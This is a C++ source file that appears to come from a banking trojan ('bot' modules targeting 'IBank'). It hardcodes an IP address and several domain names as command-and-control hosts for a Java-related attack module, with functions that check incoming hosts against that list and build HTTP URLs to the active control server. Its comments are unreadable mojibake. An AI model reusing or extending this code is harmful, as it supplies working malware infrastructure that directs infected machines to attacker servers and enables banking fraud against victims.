//---------------------------------------------------------------------------


#pragma hdrstop


#include "Modules.h"

// ���� ������ ������� � ���������� ������� �������
// �� ����� ������������ ��������� �����
#ifdef JavaConfigH
	#define USE_JAVA_HOSTS
#endif


#include "JavaConfig.h"
#include "Config.h"
#include "BotHTTP.h"
#include "HTTPConsts.h"

//---------------------------------------------------------------------------

//---------------------------------------------------------
//  ������ ������ ������ ������� IBank
//---------------------------------------------------------
#ifdef USE_JAVA_HOSTS
    #ifndef DEBUGCONFIG
		char JAVA_HOSTS[JAVA_PARAM_SIZE] = JAVA_PARAM_NAME;
	#else

		//char JAVA_HOSTS[] = "88.198.35.59\0";
//		char JAVA_HOSTS[] = //"192.168.0.250\0"
//							"bifitibsystem.org\0"
//							"systemjavabindbo.org\0"
//							"ibasystemdbaodomen.org\0"
//							"\0";

		char JAVA_HOSTS[] = "az2.zika.in\0";

	#endif
#endif

#define JAVA_HOSTS_HASH 0x2CFDA53B /* _JAVA_HOSTS_ */



//-------------------------------------------------------------------
// ������� ���������� ������ �� ����� �������� ������ ���
//-------------------------------------------------------------------
PCHAR GetJavaHosts()
{
	#ifdef USE_JAVA_HOSTS
		return JAVA_HOSTS;
	#else
        return GetBotHosts();
	#endif
}

//-------------------------------------------------------------------
//  IsJavaHost - ������� ���������� ������ ����
//  ��������� ���� ����������� ������� ������ ���
//-------------------------------------------------------------------
bool IsJavaHost(const char* Host)
{
	TStrEnum E(GetJavaHosts(), JAVA_PARAM_ENCRYPTED, 0);
	while (E.Next())
	{
		if (E.Line() == Host)
			return true;
    }
	return false;
}



PCHAR GetJavaScriptURL(PCHAR Path)
{
	//  ������� ���������� ����� ����� ��� ��������
	//	�������� ������������ � ��� ��������

	string Host = GetActiveHostFromBuf2(GetJavaHosts(), JAVA_HOSTS_HASH, JAVA_PARAM_ENCRYPTED);


	if (Host.IsEmpty()) return NULL;

	PCHAR Slash = NULL;

	if (Path == NULL || *Path != '/')
    	Slash = "/";

	PCHAR URL = STR::New(5, ProtocolHTTP, "://", Host.t_str(), Slash, Path);;

	return URL;
}
